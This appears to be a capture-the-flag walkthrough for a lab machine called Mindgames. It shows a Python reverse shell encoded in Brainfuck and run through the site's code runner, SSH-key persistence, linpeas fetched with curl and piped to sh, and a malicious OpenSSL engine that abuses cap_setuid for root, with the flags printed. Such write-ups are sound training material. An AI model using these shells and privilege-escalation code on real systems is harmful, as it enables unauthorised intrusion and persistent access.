# Mindgames
No hints. Hack it. Don't give up if you get stuck, enumerate harder

## Port Enumeration
First we started by scanning ports on the target machine using the following command:

```
nmap --top-ports 1000 -sV -sC -oN nmap-results-scripts.txt <IP>
```

Reviewing the results from Nmap we find 2 ports open, ssh and http. 

```
Nmap scan report for 10.10.117.35
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
|_  256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Mindgames.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration

Prior to navigating to the webserver via a browser, we start a web enumeration using ffuf. 

```
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.117.35/FUZZ -e .php,.js
```
Reviewing the results we observe its running javascript, but not much else of interest from the web fuzzer. 

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.117.35/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Extensions       : .php .js 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

main.js                 [Status: 200, Size: 1076, Words: 214, Lines: 27, Duration: 323ms]
:: Progress: [61407/61407] :: Job [1/1] :: 122 req/sec :: Duration: [0:08:34] :: Errors: 0 ::
```

## Website

Navigating to the webserver via a browser, we're presented with a webpage that has a new "programming product" for us. It has a text box for running code and code examples for "Hello, World" and Fibonacci sequence in an esoteric programming language. 

This esoteric programming language is immediately recognisable as [Brainfuck](https://en.wikipedia.org/wiki/Brainfuck).

Running the examples on the website, we can observe the expected program output. 

To help us understand whats happening with the language, there are encoder and decoders available for Brainfuck:

https://www.dcode.fr/brainfuck-language

https://copy.sh/brainfuck/text.html

Converting the "Hello, World" example produces the following result:

Input
```brainfuck
+[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[->+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>---.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.
```
Output
```python
print("Hello, World")
```

Now analysing the other code example.

Input
```brainfuck
--[----->+<]>--.+.+.[--->+<]>--.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.++[++>---<]>+.-[-->+++<]>--.>++++++++++.[->+++<]>++....-[--->++<]>-.---.[--->+<]>--.+[----->+<]>+.-[->+++++<]>-.--[->++<]>.+.+[-->+<]>+.[-->+++<]>+.+++++++++.>++++++++++.[->+++<]>++........---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.[-->+++<]>+.>++++++++++.[->+++<]>++....---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.++++.--------.++.-[--->+++++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.+++++.---------.>++++++++++...[--->+++++<]>.+++++++++.+++.[-->+++++<]>+++.-[--->++<]>-.[--->+<]>---.-[--->++<]>-.+++++.-[->+++++<]>-.---[----->++<]>.+++[->+++<]>++.+++++++++++++.-------.--.--[->+++<]>-.+++++++++.-.-------.-[-->+++<]>--.>++++++++++.[->+++<]>++....[-->+++++++<]>.++.---------.+++++.++++++.+[--->+<]>+.-----[->++<]>.[-->+<]>+++++.-----[->+++<]>.[----->++<]>-..>++++++++++.
```
Output
```python
def F(n):
    if n <= 1:
        return 1
    return F(n-1)+F(n-2)


for i in range(10):
    print(F(i))
```
Well, that is very recognisable python code. So we should be able to write a python reverse shell, encode it in brainfuck and run it on the webserver. 

## Brainfuck Reverse Shell

Navigating to [GTFObins](https://gtfobins.github.io/gtfobins/python/#reverse-shell), we obtain a python reverse shell. We have to slightly modify the example because the code runner on the website is a python interpreter and as such we cannot export environment variables or make calls to python. 

Here the example uses an attacker IP of `10.9.0.68`

```python
import sys,socket,os,pty;s=socket.socket()
s.connect(("10.9.0.68",4242))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
```
Encoding this with Brainfuck results in:

```brainfuck
+[----->+++<]>++.++++.+++.-.+++.++.[---->+<]>+++.---[->++++<]>-.++++++.------.-[++>---<]>+.-[--->++<]>+.----.------------.++++++++.------.[--->+<]>---.[++>---<]>--.-[----->+<]>.++++.-[++>---<]>+.-[----->+<]>+.++++.+++++.-[-->+<]>-.-[->++<]>-.+[-->+<]>+++.---[->++<]>-.----.------------.++++++++.------.[--->+<]>---.[++>---<]>.[--->++<]>-.----.------------.++++++++.------.[--->+<]>---.+[--->+<]>+.+.>++++++++++.+[--------->+<]>.+[++>---<]>.--[--->+<]>-.++++++++++++.-..---------.--.-[--->+<]>--.+[--->+<]>+..------.[-->+++<]>--.-.--.+++++++++++.-----------.++.--.++++++++.++.++[->+++++<]>.++++++++++.++++++++.--.++.--.---------..>++++++++++.[--->++<]>-.+[->++++<]>-.++++.+[++>---<]>.--[--->+<]>.--[--->+<]>-.-----.[->+++++<]>++.----------.--[->+++<]>+.+[++>---<]>.+[--->+<]>+.+++.+++.-------.+++++++++.+.+[++>---<]>.+.+++.[--->+<]>++.--.-[->+++<]>.---------.++[->+++<]>.+++++++++.+++.[-->+++++<]>+++.++[->+++<]>.--.-[--->+<]>-.-[--->++<]>-.+++++.-[->+++++<]>-.++++++++.++++++++.----.+++++.-----.++++++.---------.-[------>+<]>+.>++++++++++.-[------->+<]>+.++++.+++++.-----[++>---<]>.[--->++<]>-.---.[----->++<]>+.+[--->+<]>+.---------.++[++>---<]>.------.+++++++++++++.++[->++<]>.+++++++.+++++.++[->+++++<]>-.-[--->++<]>-.-----------.--[--->+<]>.+++++++.
```
We our rev shell payload generated, first we set up our netcat listener to receive the reverse shell on our local machine. 

```
nc -lvp 4242
```

Now we execute the brainfuck rev shell payload on the website. 

```
┌──(kali㉿kali)-[~]
└─$ nc -lvp 4242
listening on [any] 4242 ...
10.10.11.203: inverse host lookup failed: Unknown host
connect to [10.9.0.68] from (UNKNOWN) [10.10.11.203] 59772
$ 
```
Success!

## User Flag
With shell access to the target machine, lets explore to find the user flag. 

```shell
$ ls
ls
resources  server
$ pwd
pwd
/home/mindgames/webserver
$ 
```

Navigating to `mindgames` home directory. 
```shell
$ cd ~
cd ~
$ ls
ls
user.txt  webserver
$ cat user.txt  
cat user.txt
thm{411f7d38247ff441ce4e134b459b6268}
$ 
```
We found the user flag and retrieved its value. 

## Persist
Prior to exploring privilege escalation, we can persist ourselves on the server and obtain a more durable shell in the process. 

We know the server supports ssh, so lets install our own ssh key on the target under the `mindgames` user. 

If you don't already have a ssh key pair generated, generate one using `ssh-keygen`.

Following the default guided generation process, you'll have a new ssh key pair generated `id_rsa` and `id_rsa.pub`

Navigate to the location of these keys on your local machine and run a python http server to host them to the target. 

```
python3 -m http.server --bind 10.9.0.68 8000
```

Now on the target machine, create the following folder structure under the user home directory `~/.ssh/`. 

```shell
$ cd ~
cd ~
$ mkdir -p ~/.ssh/
mkdir -p ~/.ssh/
$ 
```
Now navigate to the `.ssh` folder and run the curl command to download the `id_rsa.pub` and install it as a valid key for the `mindgames` user under the `authorized_keys` file.

```shell
$ curl http://10.9.0.68:8000/id_rsa.pub >> authorized_keys
curl http://10.9.0.68:8000/id_rsa.pub >> authorized_keys
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   563  100   563    0     0    876      0 --:--:-- --:--:-- --:--:--   875
```

Now we can login via ssh using our id_rsa keypair under the `mindgames` user. 

```
ssh -i id_rsa mindgames@10.10.11.203
```


## Privilege escalation enumeration
Now onto the root flag. We now have to find a way to escalate our privileges to root. 

We begin by enumerating the linux machine using `linpeas`

First we need to get the `linpeas.sh` enumeration script onto the target. Identical to our approach for installing the ssh public key, we will download the `linpeas.sh` script locally and use a python http server to upload it to the target. 

Linpeas can be downloaded from [here](https://github.com/carlospolop/PEASS-ng) if you don't already have it available. 

Now navigate to where the `linpeas.sh` script resides and run a python http server. 

```
python3 -m http.server --bind 10.9.0.65 8000
```

Now on the target machine, use curl to download and pipe to sh the script. 

```
curl http://10.9.0.65:8000/linpeas.sh | sh
```

Wait for the linpeas.sh enumeration script to complete and then review its output. 

Reviewing the output of linpeas, we observe the following interesting privesc vectors. 

```
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034    


╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                          
/etc/systemd/system/multi-user.target.wants/server.service is calling this writable executable: /home/mindgames/webserver/server                                                                          
/etc/systemd/system/server.service is calling this writable executable: /home/mindgames/webserver/server                                                                                                  
You can't write on systemd PATH


╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                      
Current capabilities:                                                                                
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep is writable

```

We know we can reliably get root using the CVE-2021-4034 exploit via `metasploit`, but we know this is not the intended privesc path for the CTF. 

Next point of interest is the .service files. Reviewing the link provided in the linpeas output (https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services) it appears as though we can modify or replace the binary under the `mindgames` control that runs as a service as a way of creating a backdoor into the server. This allows us to persist our presence another way to the ssh keys technique we used above. This is interesting but doesn't appear to be a way for us to escalate our privileges. 

The other item we noted in the linpeas output was the opensll cap_setuid+ep. With openssl having the setuid capability set, if we can execute arbitrary code via openssl, we will be able to utilise it to set our uid to that of root. 

Some googling for `openssl cap_setuid+ep exploit`, it seems there is a method to execute arbitrary code and exploit the cap_setuid+ep. 

https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/

## Openssl setuid capability privesc attack

Following the [blog post](https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/) we begin by writing our own openssl engine that will run our exploit code to set our uid as root and spawn a bash shell. 

If you haven't already, you'll need the `build-essential` packages to compile C code for linux. Run the following command on your local machine:

```
sudo apt install build-essential
```

Next you'll need to ensure you have the ssl developer libraries and headers to compile the openssl engine. Run the following command on your local machine:

```
sudo apt install libssl-dev
```
We all the prerequisites, lets code our exploit. 

Create a new C file on your local machine `ssl-setuid.c`.

In the file write the following C code:
```c
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0); setgid(0);
  system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()   
```

Now compile your engine as a shared library run the following commands.

```
gcc -fPIC -o ssl-setuid.o -c ssl-setuid.c

gcc -shared -o ssl-setuid.so -lcrypto ssl-setuid.o
```
You'll have a shared library `ssl-setuid.so` as output.

Now, we upload to our target. We can utilise the same python http server method as above. Alternatively, if you set up ssh persistence, we can use scp to copy the file to the target. 

```
scp -i id_rsa ssl-setuid.so mindgames@10.10.11.203:~
```

Now on the target machine navigate to the location of the ssl-setuid.so shared library we just uploaded. We can now run openssl passing our custom engine with our exploit code and exploit the `cap_setuid+ep` to set our uid to root and spawn a bash shell.

```
mindgames@mindgames:~$ openssl req -engine ./ssl-setuid.so 
root@mindgames:~# whoami
root
root@mindgames:~# 
```

We have root!

## Root flag

With root, lets navigate to the root home directory where the flag is most likely to be located. 

```
root@mindgames:~# cd /root
root@mindgames:/root# ls
root.txt
root@mindgames:/root# cat root.txt 
thm{1974a617cc84c5b51411c283544ee254}
```

We have the root flag and we're done!